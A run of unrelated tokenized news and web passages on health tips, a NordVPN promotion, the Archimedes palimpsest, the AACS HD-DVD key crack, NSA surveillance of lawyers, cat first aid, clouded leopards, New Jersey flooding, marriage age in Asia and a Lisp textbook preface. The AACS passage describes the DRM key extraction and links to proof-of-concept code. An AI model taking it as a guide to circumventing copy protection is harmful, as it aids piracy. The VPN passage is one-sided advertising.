Doing so should bring down your stress levels and take some pressure off your system .
Would you consider :
Downsizing your life like some people have ?
Downsizing your home to deal with less expenditures and maintenance ?
Or just decluttering your surroundings ?
We are told by health experts that the environment contains toxins that relentlessly invade our bodies and systems , and unfortunately , it ’s something we ca n’t always control .
For instance , we can often find ourselves exposed to vehicle fumes , smog and even second hand smoke any time we leave the comfort of our homes .
Just visit a large city and you ’re inhaling less than fresh air !
Then there are chemicals in pesticide , home and beauty products ( e.g. hair spray and cosmetics ) and food ( especially the non-organic kind ) .
If you work in an old building , you could be facing the assault of toxic materials as well .
We ca n’t escape our environment but one thing we can possibly control is the amount of stress we subject ourselves to .
Stress impacts your body in the same way terrible toxins do , so do your best to avoid it .
Keep Yourself
In Tip Top Shape By Developing Simple Habits
Besides watching what we eat , there are other ways to make sure we stay healthy .
# 1 Watch your hygiene : wash your hands often .
Avoid getting sick by washing your hands often .
Unless you do n’t mind catching a bout of the cold or flu once in a while , or being a little dirty , which is actually good for you .
I ’ve had interesting conversations with a co-worker who advocates germs and infections as the way to better health in the long run .
That ’s because your body builds up its defenses and immune system by falling ill .
But as a parent of a school - aged child I still do n’t like catching annoying colds , plus getting sick often does n’t seem to have improved my health .
Besides , for some of us , a sick day means no pay .
# 2 Toss the vices .
The spirit is willing , but the flesh is weak .
It ’s something you just cannot “ nag ” someone to do , since many a time , they ’d rather take the chance and possibly face the consequences of their long term habits at a later time .
After all , the reasoning goes , you can just as easily get run over by a bus than pick up health problems from some random vice .
Nevertheless , sticking with an unhealthy vice has its risks .
One other sticking point is how much you could actually save by giving up these extras .
# 3 Visit your doctor for annual tests .
Those annual tests are covered by your health insurance or can be performed through free or low cost programs .
Routine tests can catch problems early on before they develop into real trouble later .
Do n’t let it grow into a big issue that costs a lot to deal with .
# 4 Sleep earlier .
Those times when I stayed up late or even all night to try to cram even more stuff into an already hectic day are now over .
The body just wo n’t let me do those things anymore !
And here ’s the reason for improving your sleeping habits : your body heals and repairs itself and does its regulatory job while you ’re snoozing .
So give it the rest it deserves to keep you chugging along well the next day .
A lifetime of bad sleeping habits will no doubt take a toll on you and this is one easy way to avoid getting sick .
# 5 Lose weight .
There are a lot of ways to tackle this challenge , and many articles have been written to discuss all those strategies .
But here are some of my favorite tips on how to lose weight frugally .
Simply adapt good eating habits and you ’ll drop the pounds !
Spend Less on Affordable Exercise
Get yourself moving with exercise .
Who says we ca n’t lose weight or become healthier without the help of professional trainers or gym memberships ?
A lot of people find the extra motivation by signing up for classes , whether it be for dancing , weight training , yoga , tae - kwon - do or other forms of sport .
And why not ?
Exercise can certainly be much more enjoyable in the company of others .
However , I ’m one of those people who would rather do the requisite physical activity in the comfort and privacy of my home , where I ’m also happy not to spend a dime .
I ’ve invested in a trusty stationary bike , which I ’ve had over a decade and which functions as good as new despite the heavy use it gets 😉 .
I ’ve also personally invested in some other home gym equipment ( weights , yoga mat , videos ) .
But you should weigh the costs of buying exercise equipment against how much use and value you get out of them .
Do n’t waste your money on things you do n’t use !
What ’s nice about exercise is that most activities are pretty affordable .
You do n’t have to spend an arm and a leg to keep yourself active .
Treat your body like a well - oiled machine and keep your metabolism humming and revved up by burning excess calories .
You also do n’t need to pay up to get moving .
Even a brisk walk is considered quite healthy so if you can manage a regular exercise regimen comprised of sustained activity for 30 minutes a day , at least three times a week , then you should be in good shape .

Security and Privacy
Nearly every possible device or piece of equipment that has some sort of electrical component is connected these days .
What 's more , most of us store , view and transfer immense amounts of important information and data online , via these devices .
More and more people practically live on the internet , which lets us conduct financial , official and leisure businesses all in one convenient place .
This also means that our connection to the internet is a massive security risk if not suitably protected .
NordVPN is a great way to eliminate that risk .
A key method of securing yourself online is through the use of a Virtual Private Network , or VPN .
Like so many other forms of technology , consumer VPN software has been simplified when compared to the original or professional grade protocols , often too much , so that many of the benefits of using a VPN are lost .
However , a couple of paid - for VPN products available still manage to retain all those protections and make it easy to use for everyday consumers .
NordVPN is one of the most popular .
What Does a VPN Do ?
The basic idea of a VPN is that it hides your online activity from various trackers that are built into applications and websites .
You probably are n't even aware of these trackers , but they are definitely aware of you , and will , if you allow them , follow your activity around the internet and build a sort of anonymous profile of you that can then be sold to advertisers who will use the data to target you with ads .
There are other implications too of course , and your IP address is always recorded .
This directly links any site or application you 've used back to you , via your ISP .
Through the use of a VPN , at least as far as consumers are concerned , it will make it look like you 're actually browsing whatever website you 're on from a different country than the one you 're in .
It hides your location .
NordVPN Features
Simple Interface
NordVPN is ideal for both experienced users and those who are considering a VPN for the first time .
The GUI is designed in a way to be immediately understandable for beginners , giving you a world map where you can choose the country of the VPN that will be bouncing you through .
IP Masking
Many paid VPNs provide the option to manually select your preferred country - a feature typically missing from free software - but NordVPN boasts some of the most comprehensive options .
Country selection also lets you access just about all geo - locked online content .
This is done by hiding your Internet Protocol ( IP ) address .
An IP address is a number assigned to your device by your ISP and it can be used to determine the location from where you 're accessing the internet .
This may not be a threat to your private internet connection , but when you 're in public , it can pose a serious privacy threat .
With a VPN though , all your traffic will routed through the VPN provider 's network , where you 'll be assigned a different IP address .
The more servers there are , the more IP addresses that will be available for you .
As a result , no outsider will know from what area you 're accessing the internet .
Country selection also lets you access just about all geo - locked online content .
NordVPN operates a total of 5,987 servers spread across 59 countries .
The majority of these are located in the Americas and Europe , though there are plenty of servers and locations that you can make use of in the rest of the world .
A few alternative VPN providers boast larger numbers of servers in African and Asian countries , so if that is your specific need then it is possible that NordVPN wo n't be ideal .
Fast Speed
If you already know a thing or two about VPNs , you can also get more detailed information about the servers available .
Server load , distance and type is shown within the app ( whatever platform you are on ) allowing you to select the right one to maximise speed and performance for a given activity , like peer - to - peer downloads and uploads .
No -Log Policy
Whatever you are doing online , NordVPN will not keep a record of it .
This feature is critical in this day and age when privacy breaches are all too common , and corporations are greedy to learn as much about you as possible .
With NordVPN that is literally impossible - there will be no records or logs of what you did - whether it was browse Facebook , play games or search for pet food for your cat .
Ad-Blocker
Another common feature of most VPNs have is an ad blocker .
Many websites have popup ads , and occasionally these ads can download harmful malware on your device without your knowledge .
Even if no harm is done to your device , random advertisements can be annoying .
VPNs can solve the problem by not allowing malware or ads to even load up , not to mention harm your computer .
NordVPN is one of the few VPNs that comes preloaded with an adblocker .
Country of Operations
When picking your VPN , something few people consider is checking where the company is based , even though it can make the biggest difference .
Due to laws and regulations , VPN providers in some countries like the USA and United Kingdom still have to keep all sorts of records about you and your activities .
The government having potential access to that data defeats the whole " privacy " purpose of VPNs .
NordVPN is based in Panama , a country where laws protect your data privacy rights very strictly , making it one of the most secure options out there , and significantly more secure than any USA or UK based VPN provider .
Potential Disadvantages Of A VPN
While VPNs are great , they can come with flaws .
While neither of the two we mention below apply to Nord , if you decide to go with another provider , be aware of them .
Slower Internet
A VPN connects you to the internet through a gateway , which is the VPN provider 's own server .
Since your data has to go to another location before being sent to the receiver , it takes a bit more time , and as a result , the speed of your internet might seem slow .
To better understand this , imagine having to make many turns to reach a location on a vehicle , which could otherwise be achieved by following a straight line .
If you already have slow internet or use a VPN that does n't provide great coverage , the effect can multiply and as a result , your internet speeds would seem noticeably slower .
Luckily , NordVPN offers fast speeds that are practically indistinguishable from the regular speeds .
VPNs Being Blocked
VPNs provide users with several useful features .
However , in some countries like Russia or China , the government may not want its residents to be able to access all content available on the internet .
VPNs are therefore an issue for them , since VPNs can access geographically locked content .
To counteract this , many such countries have made it completely illegal to use a VPN - except for government - approved VPNs .
Even if you do n't live in such an area , you might be using a service that blocks VPN users .
Services such as Netflix and Hulu retain customer IP addresses and compare them to the ones used by known VPN providers .
If these two match , then they block the customer .
To combat this , many VPN companies make sure to routinely change their stored IP addresses , NordVPN is one of those companies which follows this protocol .
Platforms - Including Linux
Another benefit of NordVPN is the wide platform support it boasts .
The software is available on Windows , macOS , Linux , Android and iOS , allowing you to hide your IP address on your mobile device as well .
NordVPN supports a wide array of Linux platforms including Debian , Ubuntu , Mint , Fedora , QubesOS , RHEL , CentOS and openSUSE .
Price and Value
One of the most important factors when deciding which VPN to commit to is ultimately value .
Using NordVPN requires an active plan ( much like Netflix , for example ) and the company offers several pricing schemes .
Monthly plans are as cheap as $ 3.49 per month if you join a 3 - year plan .
If you want more flexibility though , pricing from $ 4.99 through to $ 11.95 per month is available .
Having a 30 - day money - back guarantee on any plan also provides reassurance .
Considering this subscription gets you one of the best VPN services out there , with one account letting you secure six devices at once , we 'd argue it offers the best value on the market right now .
The VPN industry is a highly competitive one due to the ever increasing importance of online security , but we think that right now NordVPN offers the best service too .

Until now , the pages have remained obscured by paintings and texts laid down on top of the original writings .
Using a non-destructive technique known as X - ray fluorescence , the researchers are able to peer through these later additions to read the underlying text .
The goatskin parchment records key details of Archimedes ' work , considered the foundation of modern mathematics .
The writings include the only Greek version of On Floating Bodies known to exist , and the only surviving ancient copies of The Method of Mechanical Theorems and the Stomachion .
In the treatises , the 3rd Century BC mathematician develops numerical descriptions of the real world .
" Archimedes was like no - one before him , " says Will Noel , curator of manuscripts and rare books at the Walters Art Museum in Baltimore , Maryland and director of the imaging project .
" It just does n't get any better than re-reading the mind of one of the greatest figures of Western civilisation . "
' Eighth wonder '
Revealing Archimedes ' writings presents a huge challenge to the imaging team .
The original texts were transcribed in the 10th Century by an anonymous scribe on to parchment .
Each page takes 12 hours to reconstruct
Three centuries later a monk in Jerusalem called Johannes Myronas recycled the manuscript to create a palimpsest .
Palimpsesting involves scraping away the original text so the parchments can be used again .
To create a book , the monk cut the pages in half and turned them sideways .
To create a book Myronas also used recycled pages from works by the 4th Century Orator Hyperides and other philosophical texts .
Mr Noel describes the palimpsest as " the eighth wonder of the world " .
" You never get three unique palimpsested texts from the ancient world together in one book , " he told the BBC News website .
" That 's just completely unheard of . "
The monks filled the recycled pages with Greek Orthodox prayers .
It 's like receiving a fax from the 3rd Century BC
Will Noel
Later , forgers in the 20th Century added gold paintings of religious imagery to try to boost the value of the tome .
The result was the near total obliteration of the original texts apart from faint traces of the ink used by the 10th Century Scribe .
Bright light
Previously the privately - owned palimpsest has been investigated using various optical and digital imaging techniques .
However , much of the text remained hidden behind paint and stains .
The researchers have now turned to a technique known as X - ray fluorescence to tease out the final details of the writings .
The palimpsest contains pages from several bodies of work
The method is used in many branches of science including geology and biology .
It has previously been used by other researchers to decode ancient texts .
In August 2005 a team from Cornell University successfully deciphered a series of 2,000 - year - old worn down stone inscriptions .
The X - rays are formed in a synchrotron - a particle accelerator that uses electrons travelling at close to the speed of light to generate powerful " synchrotron " light .
The light covers a wide range of the electromagnetic spectrum , including powerful X - rays , a million times more intense than a transmission X - ray used in medical imaging .
" In fluorescence it 's like looking at the stars at night whereas in transmission it 's like looking during the day , " explains Dr Uwe Bergmann of the Stanford Synchrotron Radiation Lab in the US , where the work is being done .
The light enables scientists to look inside matter at the molecular and atomic scale .
Glowing words
The technique is particularly useful for probing the palimpsest because the ink used by the scribe to record Archimedes ' work contains iron .
" When the X - rays hit an iron atom it emits a characteristic radiation , it glows , " says Dr Bergmann .
" When you record the glow you can reconstruct an image of all of the iron in the book . "
ARCHIMEDES TEXTS IN THE PALIMPSEST Equilibrium of Planes Spiral Lines The Measurement of the Circle Sphere and Cylinder On Floating Bodies The Method of Mechanical Theorems Stomachion
The glowing words are displayed on a computer screen , giving the researchers the first glimpse of the text in nearly 800 years .
" It 's like receiving a fax from the 3rd Century BC , " said Mr Noel .
" It 's the most sensational feeling . "
Each page takes 12 hours to reconstruct as the highly focused beam of X - rays , the width of a human hair , sweeps across the page .
The team have until the 7 August this year to scrutinise the palimpsest , before the synchrotron is switched off for maintenance .
During that time they hope to scan between 12 and 14 pages , paying particular attention to the areas covered with the forged paintings .
The public can watch the researchers as they reveal the glowing ancient text during a live webcast at 2300 GMT on 4 August .

That 's the so - called " Processing Key " that unlocks the heart of every HD - DVD disk to date .
Happy Valentine 's day , AACS .
AACS , a DRM scheme used to encrypt data on HD - DVD and Blu - Ray disks , would appear to be cracked wide open by that short string of hexadecimal codes , as previously , only disk - specific Volume Keys were compromised .
The new hack is the work of Arnezami , a hacker posting at the doom9 forums , fast becoming the front line in the war on DRM .
" The AACS is investigating the claims right regarding of the hack , " said AACS spokesporson Jacqueline Price .
" It is going to take a appropriate action if it can be verified . "
Price said she could not disclose what their investigation might entail , or what " appropriate action " might be .
“ We ’ve just learned of this claim today and are checking into it , ” said Andy Parsons , chair of the Blu-ray Disc Association and senior V.P. of product development at Pioneer Electronics , in an email .
The new crack follows that from earlier this year , when a hacker by the name of muslix64 broke the AACS system as it applied to each movie .
While the earlier hack led to 100 HD - DVD titles and a small number of Blu - Ray movies being decrypted one - by - one , the so - called " processing keys " covers everything so far made . :
" Most of the time I spend studying the AACS papers , " Arnezami said in his forum post revealing the successful assault on the next - gen DRM system .
" ... what I wanted to do is " record " all changes in this part of memory during startup of the movie .
Hopefully I would catch something insteresting .
... I now had the feeling I had something .
And I did .
...
Nothing was hacked , cracked or even reverse engineered btw : I only had to watch the " show " in my own memory .
No debugger was used , no binaries changed . "
It 's not yet clear what it means for the consumer 's ability to copy movies , or , for that matter , that of mass - market piracy operations .
The short form is that the user still needs a disk 's volume ID to deploy the processing key and break the AACS encryption — but getting the ID is surprisingly easy .
Arnezami found that they are not even random , but often obvious to the point of foolishness : one movie 's Volume ID turns out to be it's own name and the date it was released .
There is n't yet an automatic system , however , that will copy any disk , in the manner of DeCSS - based DVD copying systems .
Even so , the new method completely compromises HD - DVD in principle , as it relies on AACS alone to encrypt data , even if there are other parts of the puzzle that are yet to fit together .
Blu - Ray has two more levels of protection : ROM - MARK ( a per factory watermark , which might revoke mass production rights from a factory but not , it seems individuals ) and BD+ , another encyption system , which has n't actually been used yet on sold disks ( but which soon will be ) , meaning that its own status seems less obviously compromised .
How might the companies respond ?
The processing key can now be changed for future disks .
However , the flaws inherent in the system make it appear easy to discover the replacement : the method of attack itself will be hard to offset without causing knock - on effects .
For example , revoking player keys ( in advance of obfuscating the keys in memory in future revisions of the system ) would render current players unable to view future movies .
Revoking the volume and processing keys that have been hacked would mean that all movies to date would not run on new players .
Publishers could randomly generate Volume IDs in future releases ( as they are still needed for the current hack to work ) , which would make them harder to brute - force .
That said , it 's claimed that the " specific structure " of the Volume ID in memory makes it feasible to brute - force randomized ones anyway .
Following are links to the current discussion at the doom9 forums , in which Arnezami and other provide regular updates on their progress .
We do n't offer any warantee that the software implementations so far produced wo n't blow up your computer or get you thrown in jail and whipped with wet towels by MPAA lawyers :
Proof of concept code for the process key hack is here : http://forum.doom9.org/showthread.php?p=953484#post953484

A civil liberties organization on Thursday sued the Justice Department and the National Security Agency in New York federal court , alleging that the government illegally spied on 16 lawyers who have represented detainees at the Guantanamo Bay Naval Station in Cuba .
The suit , filed by the Center for Constitutional Rights , demands that the agencies comply with requests filed under the Freedom of Information
Act to turn over all records of the NSA ’s warrantless wiretapping of the attorneys .
The secret eavesdropping program was launched after the Sept. 11 attacks and came to light in December 2005 .
In January 2006 , the center submitted requests for records pertaining to the surveillance of the lawyers , said Shayana Kadidal , a center attorney .
The NSA and the Department of Justice refused to provide relevant documents within the required time , the plaintiffs ’ attorneys said .

“ I am outraged that the NSA and DOJ have categorically refused to say whether they have eavesdropped -- without a warrant -- on me or other attorneys simply because we have fought for basic due process for men imprisoned without charge or trial at Guantanamo , ” said New York lawyer Wells Dixon , one of the plaintiffs .
The government had no comment on the lawsuit .
U.S. officials have acknowledged the existence of the Terrorist Surveillance Program , saying that it targets telephone calls and e-mails “ only when one party is outside the U.S. and there is probable cause to believe that at least one party is a member or agent of Al Qaeda or an affiliated terrorist organization . ”
But they have declined to provide details , saying it would harm efforts in the war on terrorism .
“ The government believes ... that pretty much all of our post 9/11 clients ” have links to terrorism , Kadidal said .
“ So we think our calls to them fit the narrow category of calls , ” Kadidal said , “ that Atty . Gen. Alberto Gonzales ” told Congress the NSA was targeting .

Restraining an injured cat is a great technique to learn to help your pet receive the proper cat care .
How you approach the cat will depend on whether the cat is cooperative or uncooperative .
This is important because a cat has five weapons : the mouth and four claws .
Cats do n't react in their usual manner when they 're injured because of the stresses involved .
The following methods should minimize your chances of being scratched or bitten by the frightened cat you are trying to help .

Restraining a Cooperative Cat
You should try Method 1 or Method 2 when you have someone else with you to help your injured cat .
Place the cat in your arms or lap or on a table or other raised surface using either of the following two methods .
Method 1
Step 1 : Position yourself so the cat 's head is to your left .
Step 2 : Reach with your right hand over the cat 's body and under its chest so the chest is resting in your palm .
Step 3 : Lift the cat firmly toward you so that its body is secured between your forearm and your body .
Step 4 : Grasp the top of the front legs with the fingers of your right hand , which is still supporting the chest .
Step 5 : Using the other hand , prevent the head from moving by grasping under the throat .
Scratching the ears with this hand from under the throat is often very comforting .
Step 6 : Treatment can then be administered by your assistant while the cat is in your arms .

The mainland clouded leopard ( left ) has been separated from its island cousin ( right ) for about 1.4 million years , research suggests
Film of leopard
Until now it had been thought they belonged to the species that is found on mainland southeast Asia .
Scientists now believe the two species diverged more than one million years ago , and have evolved separately since .
With bodies up to 1.1 m long , clouded leopards are the biggest predators on Borneo and one of Asia 's largest cats .
It 's incredible that no - one has ever noticed these differences
Andrew Kitchener
" Genetic research results clearly indicate that the clouded leopards of Borneo should be considered a separate species , " said Dr Stephen O'Brien , head of the Institute 's Laboratory of Genomic Diversity .
" DNA tests highlighted around 40 differences between the two species . "
Tell tails
Supporting evidence came from examination of fur patterns .
Leopards from Borneo and Sumatra have small " clouds " with many distinct spots within them , grey and dark fur , and twin stripes along their backs .

" The moment we started comparing the skins of the mainland clouded leopard and the leopard found on Borneo , it was clear we were comparing two different species , " said Dr Andrew Kitchener from the National Museums of Scotland .
" It 's incredible that no - one has ever noticed these differences . "
WWF , which maintains a large conservation operation on Borneo , estimates there are between 5,000 and 11,000 clouded leopards on the island , with a further 3,000 to 7,000 on Sumatra .
" The fact that Borneo 's top predator is now considered a separate species further emphasises the importance of conserving the ' Heart of Borneo ' , " said WWF 's Stuart Chapman , co-ordinator of a project seeking to preserve the island 's wildlife .
The three governments with territory on the island - Indonesia , Malaysia and Brunei - signed an agreement earlier this year pledging to protect the " Heart of Borneo " , 200,000 square kilometres of rainforest in the middle of the island thought to be particularly high in biodiversity .

After the storm : a New Jersey town struggles to recover
By Robert Milkowski
11 May 2007
On April 26 , nearly two weeks after a brutal spring storm hit New Jersey , President Bush declared six counties — Bergen , Burlington , Essex , Passaic , Somerset and Union — federal disaster areas .
Acting Governor Richard J. Codey estimated that New Jersey sustained $ 180 million in damage from the rain on April 15 and 16 that left 40,000 people without power and forced 3,000 people from their homes .
The governor wants to see the entire state declared a disaster area .
More counties may be added as the Federal Emergency Management Agency ( FEMA ) completes damage surveys .
The northeaster swept the Eastern Seaboard from South Carolina to Maine , leaving 18 dead in its wake .
One New Jersey Town , Bound Brook , was particularly hard hit .
Flood walls , levees and a water pumping station installed by the Army Corps of Engineers — part of a still incomplete flood control project that has lasted for decades — failed to hold back the water .
The result : five feet or more of flooding .
“ The pumps did n’t work , ” Michael Picone told the World Socialist Web Site on May 3 as he was performing flood repairs on a 20 - unit apartment complex he owns on Bound Brook ’s East 2nd Street .
“ They were installed to take the overflow from the storm sewers and put it back into the river — that was the theory , anyway .
But all they pumped was air .
Someone told me there was a news story on CNN that said Jeb Bush was affiliated with the company that made the pumps .
I would n’t doubt it .
You ca n’t trust those guys . ”
East 2nd Street suffered dramatically .
Nearly every house on the block — most of them World War I era two - family homes — had windows marked by the fire department with large spray - painted X’s , indicating that the house had been checked and families removed to safety during the flood .
“ They were taking people out of here in row boats , ” Picone said , looking out at a street littered with clumps of wet sheet rock , remnants of walls torn from the flooded homes .
He continued , “ People put a false faith in the [ Army Corps of Engineer ’s ] flood project .
After Floyd they took out loans and rebuilt their businesses and homes .
They were resilient .
Now they ’re more numb than resilient .
It feels like there ’s a diminishing future for the whole town . ”
Hurricane Floyd hit the state as a tropical storm in 1999 , killing six people .
Three of them who drowned in Bound Brook , when record rainfall sent 12 feet of water down Main Street .
Many of the over one thousand Bound Brook residents who were forced to stay in temporary shelters due to last month ’s flooding were immigrant workers from Costa Rica .
“ They tend to live in illegal basement apartments , ” Father Ed Murphy , of the St. Paul Episcopal Church told the WSWS .
“ You know , it ’s not uncommon in this town — you have a two family house , the owner lives on the first floor , the mother - in - law lives up on the second floor and you have a family of laborers living in the basement .
So when the basement gets flooded , they end up in shelters . ”
The church is a temporary housing facility for FEMA , its meeting room full of blue - jacketed FEMA employees and state police troopers .
A Sunday school classroom has been turned into a temporary nursery for children .
The nursery provides a playroom for kids whose parents come to brave the lengthy , mind - numbing task of presenting their disaster case to FEMA .
“ All they need is to have one member of the family — even their baby — with a valid Social Security number and they ’re eligible for help , ” Murphy said .
“ But , still , a lot of folks are afraid . ”
“ These people are a part of this community , ” he said .
“ They ’re beautiful , young , hardworking .
But the floods disrupt their lives
It ’s very stressful ”
He showed the WSWS another Sunday school classroom with a now ironic mural of Noah ’s Ark on the wall .
The room held provisions donated by the community to help the temporarily homeless .
“ We ’ve got instant coffee , pasta , pampers — I ’m still trying to get somebody to donate a pallet more of these , ” he laughed , picking up a bag of the disposable diapers .
“ Pampers are like gold . ”
Just over a block away , the Bound Brook Presbyterian Church housed about half of the remaining homeless families .
“ As of this afternoon , ” Head Pastor , Lou Kilgore told the WSWS , “ the other half are being brought here .
So this will be the one remaining shelter .
We ’ll have about 120 people .
The problem is that this storm knocked out about two hundred housing units so these folks are going to have a tough time finding a place to live until apartments become available again . ”
When the WSWS asked him why people did n’t move elsewhere , he answered , “ It ’s not that easy — this is their community .
Most of these people are Costa Rican .
In fact , I can tell you the town they come from in Costa Rica — San Isidro .
There ’s work in Bound Brook for them .
They know if they brave the journey up here there ’ll be a community of people they trust .
It ’s their community as much as ours and they do n’t want to leave it — they should n’t have to .
But where can they go ? ”
“ FEMA , ” he continued , “ I do n’t know , they ’re slow in providing immediate help and people are scared to go to them .
The Red Cross , on the other hand , will hand you a check for one month ’s rent and the security deposit — no questions asked , no strings attached — as long as you can show them a letter , signed by a landlord .
But right now there ’s nothing available .
So you have people walking around with a guaranteed month ’s rent and deposit , plus the deposit check given to them from their last apartment , but nowhere to live . ”
The plight of residents of this one New Jersey town weeks after a severe storm is irrefutable testimony to the inadequate and patchwork character of the government ’s response to disasters .
While the administration in Washington has had no difficulty spending over $ 500 billion so far on the war in Iraq and continuously invokes “ homeland security ” as its principal concern , it fails miserably in providing for and is largely indifferent toward the security of people like those in Bound Brook , who are confronting real crises resulting from the ravages of nature
And Bound Brook is no exception .
It is in a sense a reproduction in miniature of the devastation — and devastating societal and governmental failure — seen in New Orleans in 2005 .
Working people in Bound Brook are highly suspicious of the Bush administration , though the failure to provide protection from the recurrent flooding of the Raritan River is the fault as well of Democratic and Republican administrations that preceded it .
“ We are skeptical , ” Sheridan Fitzpatrick of Bound Brook told the Newark Star Ledger on April 29 , the Day FEMA arrived .
“ I ’ve been homeless for over two weeks .
They should have been here pronto . ”
“ There ’s a lot more anger this time than with Floyd , ” Bound Brook councilman Jim Lefkowitz told the Ledger .
“ After Floyd people were encouraged to come back and fix things up because the government was going to help alleviate the flooding .
Now , seven years later , here we are again . ”
A strong sense of community remains in Bound Brook , despite widespread bitterness towards the failure of the federal government to provide adequate relief
The WSWS talked to Maurice , one of the Costa Rican workers who was fortunate enough to be able to move back into his apartment with his wife and children a few days after the flooding subsided .
He was doing light construction work in the same church that housed him for those stressful days .
Asked if he ever considered moving , he replied , “ Yes , I am going to move as soon as I can afford it . ”
To another town ?
“ No , no , ” he said “ To a part of this town that does n’t flood . ”

Hurley raised eyebrows last week when she got married at 41 to an Indian businessman in Asia , a region where U.N. statistics show that the age of first marriages ranges between 18 and 28 years .
By comparison , the average age in Europe is between 25 and 30 years and 26 years in the United States .
Strong family and age - old cultural traditions still dictate many social norms in the region , where many women say they feel pressured to get married as soon as they hit their 20s .
The question “ when are you getting married ? ” becomes more frequent as the woman ’s education and family income levels decrease , sociologists say .
Hurley wed businessman Arun Nayar in India , a country where most women are married off in their early 20s -- if not before .
In Pakistan and Afghanistan , the story is rarely different .
“ There is a saying in Java that women have an expiration date and must marry before it , ” said Indonesian Mita Valina Liem , a college - educated ethnic Chinese who is still single at 28 .
In predominantly Muslim Indonesia , many parents get seriously worried about daughters who are still single at 25 .
At 35 , they often give up hope .
In Vietnam , where traditional family structures are strong , many city girls aim to be married by 25 or soon after they finish college .
In the countryside , they tend to marry even sooner .
“ There are too many fun things to do in life these days such as pursuing your dream career , besides caring for your family , ” said one 28 - year - old professional at a Hanoi investment company .
“ Unfortunately , in Vietnam we still cannot do both successfully , so one has to choose , ” said the woman , who declined to be named .
“ I would love to have my own child without a husband but my parents would not like that so I wish someday to find a man I love to father my children ” .
SINGLE , BUT NO SPINSTER
In Asia , as in other parts of the world , economic prosperity tends to ease the pressure .
In Singapore , a strong economy and modern , hectic lifestyle mean that more and more women are marrying at a later age , if at all .
Worried about the declining birth rate , the government offers incentives for couples to have children .
The situation is similar further north , especially in Japan where unmarried women over the age of 25 used to be called “ Christmas cake ” -- past their best , just like a cream and strawberry pastry popular in the country during the holiday .
But today , Japanese women are increasingly waiting longer to marry .
The average age for first marriage rose to around 30 in 2005 , up from about 26 in 1992 .
South Korean women are cut even more slack .
Korean men think the right age for women to get married is before 30 but women believe it is around 31 .
The cut - off age is around 37 .
Lee Mi-kyong , consultant at matchmaking service DUO Marriage Information , said even women in their 30s now feel less obliged to get married as they are more financially independent .
“ We refer to spinsters as ‘ Gold Miss ’ now , meaning they have passed the normal age to get married or that they are well off and independent , ” she said , talking about women aged 33 and over .
“ Women in their late 20s are more obligated to get married but once they reach their 30s , they start thinking they will get married at their own time .
The media are also increasingly portraying single women in their thirties as independent and financially well off , ” she added .
But even here , the “ old maid ” stereotype is still alive and well .
Many single South Korean women of any age dread family gatherings where the topic of their marital status is fodder for gossip sessions .
“ There is a stereotype that , if you ’re in your mid-thirties and not married , there is something wrong with you , or you ’ve been through a difficult experience or you ’re just unyielding and stubborn , ” said Kwon Hyun-min , a marketing specialist in Seoul .
“ That ’s not a good thing , ” she said , adding that the unofficial cut - off age among her friends and colleagues is 35 .
Paradigms of AI Programming : Preface
paradigm n 1 an example or pattern ; esp an outstandingly clear or typical example .
- Longman 's Dictionary of the English Language , 1984
This book is concerned with three related topics : the field of artificial intelligence , or AI ; the skill of computer programming ; and the programming language Common Lisp .
Careful readers of this book can expect to come away with an appreciation of the major questions and techniques of AI , an understanding of some important AI programs , and an ability to read , modify , and create programs using Common Lisp .
The examples in this book are designed to be clear examples of good programming style - paradigms of programming .
They are also paradigms of AI research - historically significant programs that use widely applicable techniques to solve important problems .
Just as a liberal arts education includes a course in " the great books " of a culture , so this book is , at one level , a course in " the great programs " that define the AI culture . [ 1 ]
At another level , this book is a highly technical compendium of the knowledge you will need to progress from being an intermediate Lisp programmer to being an expert .
Parts I and II are designed to help the novice get up to speed , but the complete beginner may have a hard time even with this material .
Fortunately , there are at least five good texts available for the beginner ; see page xiii for my recommendations .
All too often , the teaching of computer programming consists of explaining the syntax of the chosen language , showing the student a 10 - line program , and then asking the student to write programs .
In this book , we take the approach that the best way to learn to write is to read ( and conversely , a good way to improve reading skills is to write ) .
After the briefest of introductions to Lisp , we start right off with complex programs and ask the reader to understand and make small modifications to these programs .
The premise of this book is that you can only write something useful and interesting when you both understand what makes good writing and have something interesting to say .
This holds for writing programs as well as writing prose .
As Kernighan and Plauger put it on the cover of Software Tools in Pascal :
Good programming is not learned from generalities , but by seeing how significant programs can be made clean , easy to read , easy to maintain and modify , human - engineered , efficient , and reliable , by the application of common sense and good programming practices .
Careful study and imitation of good programs leads to better writing .
This book presents a body of knowledge loosely known as " AI programming techniques , " but it must be recognized that there are no clear - cut boundaries on this body of knowledge .
To be sure , no one can be a good AI programmer without first being a good programmer .
Thus , this book presents topics ( especially in parts III and V ) that are not AI per se , but are essential background for any AI practitioner .
Why Lisp ?
Why Common Lisp ?
Lisp is one of the oldest programming languages still in widespread use today .
There have been many versions of Lisp , each sharing basic features but differing in detail .
In this book we use the version called Common Lisp , which is the most widely accepted standard .
Lisp has been chosen for three reasons .
First , Lisp is the most popular language for AI programming , particularly in the United States .
If you 're going to learn a language , it might as well be one with a growing literature , rather than a dead tongue .
Second , Lisp makes it easy to define new languages especially targeted to the problem at hand .
This is especially handy in AI applications , which often manipulate complex information that is most easily represented in a novel form .
Lisp is one of the few languages that allow full flexibility in defining and manipulating programs as well as data .
All programming languages , by definition , provide a means of defining programs , but many other languages limit the ways in which a program can be used , or limit the range of programs that can be defined , or require the programmer to explicitly state irrelevant details .
Third , Lisp makes it very easy to develop a working program fast .
Lisp programs are concise and are uncluttered by low - level detail .
Common Lisp offers an unusually large number of predefined objects , including over 700 functions .
The programming environment ( such as debugging tools , incremental compilers , integrated editors , and interfaces to window systems ) that surround Lisp systems are usually very good .
And the dynamic , interactive nature of Lisp makes it easy to experiment and change a program while it is being developed .
It must be mentioned that in Europe and Japan , Prolog has been as popular as Lisp for AI work .
Prolog shares most of Lisp 's advantages in terms of flexibility and conciseness .
Recently , Lisp has gained popularity worldwide , and Prolog is becoming more well known in the United States .
As a result , the average AI worker today is likely to be bilingual .
This book presents the key ideas behind Prolog in chapters 11 and 12 , and uses these ideas in subsequent chapters , particularly 20 and 21 .
The dialect of Lisp known as Scheme is also gaining popularity , but primarily for teaching and experimenting with programming language design and techniques , and not so much for writing large AI programs .
Scheme is presented in chapters 22 and 23 .
Other dialects of Lisp such as Franz Lisp , MacLisp , InterLisp , ZetaLisp and Standard Lisp are now considered obsolete .
The only new dialect of Lisp to be proposed recently is EuLisp , the European Lisp .
A few dialects of Lisp live on as embedded extension languages .
For example , the Gnu Emacs text editor uses elisp , and the AutoCad computer - aided design package uses AutoLisp , a derivative of Xlisp .
